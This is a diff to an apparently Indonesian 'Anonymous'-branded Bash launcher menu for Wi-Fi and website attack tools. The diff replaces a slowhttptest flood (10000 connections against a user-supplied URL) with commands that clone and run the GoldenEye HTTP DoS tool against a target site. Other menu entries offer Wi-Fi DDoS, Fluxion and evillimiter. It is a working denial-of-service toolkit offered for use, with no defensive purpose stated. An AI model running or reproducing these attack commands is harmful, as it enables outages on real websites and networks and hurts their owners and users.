@@ -25,8 +25,8 @@ echo "$2[2]─>>CONTROL NETWORK WIFI EVILLIMITER" | lolcat
 echo "$3[3]─>>PENETRATION TESTING WIFI FLUXION" | lolcat
 echo "$4[4]─>>VULNERABILITY SCANNING WEBSITE REDHAWK" | lolcat
 echo "$5[5]─>>DDOS ATTACK WIFI" | lolcat
-echo "$6[6]─>>DDOS ATTACK WEBSITE HTTP" | lolcat
-echo "$7[7]─>>CHECK IP ADDRESS WEBSITE" | lolcat
+echo "$6[6]─>>DDOS ATTACK WEBSITE" | lolcat
+echo "$7[7]─>>SCANNING WEBSITE ADDRESS" | lolcat
 echo "$8[8]─>>" | lolcat
 echo "$9[9]─>>EXIT" | lolcat
 echo "**********************************************************************************"
@@ -68,7 +68,8 @@ apt install python3 -y
 apt install openssl -y
 apt install git -y
 apt install slowhttptest -y
-pip3 install slowloris -y
+apt install gnome-terminal -y
+apt install etherape -y
 echo "##################################################################################"
 echo "SEMUA PACKAGE BERHASIL DI INSTALL" | lolcat
 echo "##################################################################################"
@@ -156,9 +157,14 @@ echo "**************************************************************************
 echo "[!]RUNNING TOOLS DDOS ATTACK WEBSITE" | lolcat
 echo "##################################################################################"
 sleep 5
-echo "╭─[Masukan URL Website HTTP]" | lolcat
+git clone https://github.com/jseidl/GoldenEye
+chmod +x GoldenEye/*
+cd GoldenEye
+echo "╭─[Masukan URL Website]" | lolcat
 read -p"╰─>> " url
-slowhttptest -c 10000 -H -g -o slowhttp -i 10 -r 200 -t GET -u $url
+./goldeneye.py $url -w 129 -d
+gnome-terminal
+etherape
 fi
 
 if [ $pil = 7 ]
@@ -170,7 +176,7 @@ sleep 2
 echo "##################################################################################"
 toilet -f future "ANONYMOUS INDONESIA @MrXonee" | lolcat
 echo "**********************************************************************************"
-echo "[!]RUNNING TOOLS CHECK IP ADDRESS WEBSITE" | lolcat
+echo "[!]RUNNING TOOLS SCANNING WEBSITE ADDRESS" | lolcat
 echo "##################################################################################"
 sleep 5
 python3 checkip.py
